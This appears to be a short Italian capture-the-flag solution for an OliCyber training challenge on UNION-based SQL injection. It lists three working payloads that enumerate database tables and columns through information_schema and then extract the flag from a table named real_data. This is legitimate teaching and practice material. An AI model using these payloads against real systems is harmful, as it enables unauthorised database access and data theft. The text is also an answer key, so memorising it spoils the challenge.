# Web 18 - SQLi 2: UNION based SQL injection

Per il secondo livello visita la seguente pagina: http://web-17.challs.olicyber.it/union

Per informazioni generali sull'argomento consultare l'[introduzione](http://web-17.challs.olicyber.it/)


SOLUZIONE

```

-- Prima query
-- -- Reperisci tutte le tabelle presenti nel database
1' OR 1=1 UNION SELECT 1, table_name, 3, 'string', 'string', 6 FROM information_schema.tables WHERE table_schema = DATABASE()  --


-- Seconda query
-- -- Reperisci le colonne della tabella interessata (real_data)
1' OR 1=1 UNION SELECT 1, column_name, 3, 'string', 'string', 6 FROM information_schema.columns WHERE table_name = "real_data"  -- 


-- Terza query
-- -- Reperisci la flag
1' OR 1=1 UNION SELECT 1, 2, 3, id, flag, 6 FROM real_data -- 

```